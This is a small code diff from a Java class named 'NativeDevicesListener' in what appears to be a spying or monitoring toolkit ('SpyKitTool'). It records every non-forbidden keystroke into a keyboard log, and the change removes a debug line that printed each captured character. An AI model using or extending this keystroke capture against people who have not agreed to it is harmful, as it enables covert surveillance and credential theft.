@@ -151,7 +151,6 @@ class NativeDevicesListener extends SpyKitTool {
             idleListener.receiveEvent(e);
             if (!ForbiddenKeys.isForbidden(e.getKeyCode())) {
                 keyboardLogs.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
-                System.out.println(e.getKeyChar());
             }
         }
 
